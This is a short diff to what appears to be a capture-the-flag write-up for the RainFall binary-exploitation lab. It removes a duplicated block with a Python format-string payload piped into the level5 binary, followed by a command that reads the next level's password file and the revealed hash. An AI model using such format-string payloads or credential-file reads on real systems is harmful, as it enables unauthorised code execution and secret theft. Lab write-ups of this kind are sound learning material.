@@ -50,10 +50,4 @@ level4@RainFall:~$ cat /tmp/level5 - | ./level5
 (...)
 cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
-
-level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' '%x08' * 2 + '%134513805d%n'" > /tmp/level5
-level4@RainFall:~$ cat /tmp/level5 - | ./level5
-(...)
-cat /home/user/level6/.pass
-d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
